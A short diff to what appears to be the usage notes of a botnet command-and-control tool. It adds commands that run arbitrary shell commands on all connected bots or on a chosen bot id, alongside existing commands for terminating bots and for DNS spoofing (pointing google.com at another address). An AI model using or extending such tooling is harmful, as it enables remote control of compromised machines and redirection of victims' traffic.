@@ -26,6 +26,8 @@ os.system('echo "1" > /proc/sys/net/bridge/bridge-nf-call-iptables')
  - x to terminate c2
  - cmd=XXX to terminate all bots
  - cmd=0_XXX to terminate botid == 0
+ - cmd=ps -aux (this will execute "ps -aux" on all connected bots)
+ - cmd=0_ps -aux (this will execute "ps -aux" on the bot id 0)
  - cmd=0_spoofdns=google.com:1.2.3.4
 
 
